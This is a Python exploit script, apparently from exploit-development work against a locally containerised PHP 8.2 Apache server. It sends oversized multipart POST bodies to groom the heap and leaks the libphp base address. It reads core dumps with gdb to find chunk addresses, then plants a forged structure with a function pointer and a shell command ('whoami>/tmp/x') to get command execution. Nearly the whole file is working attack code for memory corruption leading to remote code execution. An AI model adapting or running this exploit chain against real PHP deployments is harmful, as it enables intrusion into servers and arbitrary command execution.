#!/usr/bin/env python3
"""oom127: K-GEOMETRY SEA ARM — proven payload68 post geometry, values carry
the sea + block.

Model (all core-verified tonight):
- walked arData = real buckets then STALE TAIL = freed raw-body read-buffer
  realloc copies (K-sea proof: 'K' exists only in names).
- copy-end ~= fatal-cut body offset (~8.2-8.6MB) -> stale window = body
  bytes near the cut -> SEA = parts 2300..2999 values (body 7.1-9.2MB).
- oom118 corner B (B||B values -> silent, no segv) = arm SUCCEEDS without
  block (rdi -> live chunk, huge rc, decrement survives). So armed post
  failing = SILENT: iteration must alternate MEASURE (v-values, crashes,
  core+tags) and ARM (sea tile + block) rounds.
- sizes identical across rounds -> same malloc stream -> same chunk addrs
  (fork-cloned heap). Value tags (u32 MAGIC+i x2) locate chunk starts.

Rounds: anchor (proven verbatim, health check) -> [measure -> arm] x3.
Win: /tmp/x via test -f. Every core: gdb rdi + tag map.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
KEYLEN = P.KEYLEN                 # 3064
K1 = 4200
VLEN = 1537                       # value_tile law: 1537B values
SEA_LO, SEA_HI = 2300, 3000       # sea parts (fatal cut ~2600-2800)
BLOCK_PART = 2400                 # well before cut
NSEED = 10
CORE = "/tmp/core.127"

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr) * 2

def tag8(i):
    return struct.pack("<II", MAGIC + i, MAGIC + i)

def name_of(i):
    # 'p' + tag8 + K*(KEYLEN-8-8) + '%d'  == payload68 name length exactly
    return b'--BOUND\r\nContent-Disposition: form-data; name="p' + tag8(i) + \
           b"K" * (KEYLEN - 16) + b"%d" % i + b'[x]"\r\n\r\n'

def value_measure(i):
    return tag8(i) + b"v" * (VLEN - 8)

def value_arm(i, B=None, OFF=0):
    if B is None or not (SEA_LO <= i < SEA_HI):
        return value_measure(i)
    v = bytearray(cell_of(B) * (VLEN // 16) + b"P")   # 1537B sea
    if i == BLOCK_PART:
        st = struct.pack_into
        st("<II", v, OFF + 0x00, 1, 0x108)
        st("<II", v, OFF + 0x08, 1, 0)
        st("<Q", v, OFF + 0x10, 0)
        st("<Q", v, OFF + 0x18, B + 0x68)
        st("<I", v, OFF + 0x2C, 1)
        st("<Q", v, OFF + 0x50, B + 0x90)
        v[OFF + 0x58] = 6
        st("<I", v, OFF + 0x5C, 0x106)
        st("<Q", v, OFF + 0x68, 0)
        st("<Q", v, OFF + 0x70, BASE + ZIF)
        st("<IIQI", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
        v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
        for s in range(0, len(v) - 15, 16):
            if not (OFF <= s < OFF + 0xB8):
                v[s:s + 16] = cell_of(B)
    return bytes(v)

def build_post(vals):
    ps = []
    for i in range(K1):
        ps.append(name_of(i) + vals[i] + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire(tag, body, tries=2, want_crash=True):
    for t in range(tries):
        sh("rm -f /tmp/core /tmp/core.used")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        print("%s try%d: http=%s segv+%d core=%s"
              % (tag, t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y"), flush=True)
        if crashed == want_crash:
            return crashed, c, r
    return crashed, c, r

def pull_core(dst):
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + dst], capture_output=True)
    subprocess.run(["docker", "cp", "phpbuild:" + dst, "/tmp/scan_core"], capture_output=True)

def core_tags():
    import mmap
    f = open("/tmp/scan_core", "rb")
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    e_phoff = struct.unpack_from("<Q", mm, 0x20)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", mm, 0x36)
    m4 = struct.pack("<I", MAGIC)
    out = {}
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from("<I", mm, off)[0]
        p_offset, p_vaddr, _pa, p_filesz = struct.unpack_from("<QQQQ", mm, off + 8)
        if p_type != 1 or p_filesz < 0x10000:
            continue
        data = mm[off:off + p_filesz]
        start = 0
        while True:
            j = data.find(m4, start)
            if j < 0:
                break
            idx = struct.unpack_from("<I", data, j + 4)[0]
            if idx < K1 and struct.unpack_from("<I", data, j + 8)[0] == MAGIC + idx:
                out.setdefault(idx, p_vaddr + j)
            start = j + 1
    mm.close(); f.close()
    return out

def core_rdi(corepath):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi rbx rip\\nquit\\n" > /tmp/g127.gdb'],
                    capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g127.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi|^rbx|^rip'" % corepath],
                       capture_output=True, timeout=240)
    return r.stdout.decode("latin1").strip()

print("=== oom127: K-geometry sea arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

# ---- warm shape (H-SHAPE law) ----
for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)
print("pre x: %s" % x_state(), flush=True)

# ---- anchor: proven verbatim post (health check) ----
anchor = P.build_attack(4200, 5000000)
crashed, c, r = fire("anchor", anchor)
print("anchor verdict: crashed=%s x=%s" % (crashed, x_state()), flush=True)
if crashed:
    pull_core(CORE + "_anchor")
    print("anchor gdb: " + core_rdi(CORE + "_anchor"), flush=True)

B = None; OFF = None
for rnd in range(1, 5):
    measure_vals = [value_measure(i) for i in range(K1)]
    m_body = build_post(measure_vals)
    a_body = build_post([value_arm(i, B, OFF or 0) for i in range(K1)]) if B else None
    print("--- r%d (B=%s OFF=%s) measure %.2fMB arm %s ---"
          % (rnd, B and hex(B), OFF, len(m_body) / 1048576.0,
             a_body and "%.2fMB" % (len(a_body) / 1048576.0)), flush=True)
    if a_body:
        assert len(a_body) == len(m_body), "arm/measure size drift"
        crashed, c, r = fire("r%d-arm" % rnd, a_body, want_crash=False)
        xs = x_state()
        print("r%d-arm x: %s" % (rnd, xs), flush=True)
        if xs.startswith("X_EXISTS"):
            print("!!! CAMPAIGN WON (arm r%d): %s" % (rnd, xs), flush=True)
            break
        if crashed:
            pull_core("%s_r%darm" % (CORE, rnd))
            print("r%d-arm gdb: %s" % (rnd, core_rdi("%s_r%darm" % (CORE, rnd))), flush=True)
    # measure round (always: crash + fresh tags)
    crashed, c, r = fire("r%d-meas" % rnd, m_body)
    xs = x_state()
    print("r%d-meas x: %s" % (rnd, xs), flush=True)
    if xs.startswith("X_EXISTS"):
        print("!!! CAMPAIGN WON (meas r%d): %s" % (rnd, xs), flush=True)
        break
    if not crashed:
        print("r%d-meas no crash - reshaping" % rnd, flush=True)
        for k1 in P.K1S[-3:]:
            post_mod(P.build_attack(k1, 5000000))
        continue
    pull_core("%s_r%dm" % (CORE, rnd))
    print("r%d-meas gdb: %s" % (rnd, core_rdi("%s_r%dm" % (CORE, rnd))), flush=True)
    tags = core_tags()
    print("tags: %d" % len(tags), flush=True)
    a = tags.get(BLOCK_PART)
    if a is None:
        print("BLOCK_PART %d not tagged; keys=%s" % (BLOCK_PART, sorted(tags)[:8]), flush=True)
        continue
    found = False
    for o in range(24, VLEN - 0xB8, 8):
        cand = a + o
        if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
            nb = cand.to_bytes(6, "little")
            if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
                B, OFF = cand, o
                print("ARM: B=0x%x OFF=0x%x (A=0x%x)" % (B, OFF, a), flush=True)
                found = True
                break
    if not found:
        print("no legal B from A=0x%x" % a, flush=True)

print("final x: %s" % x_state(), flush=True)
print("=== done ===", flush=True)
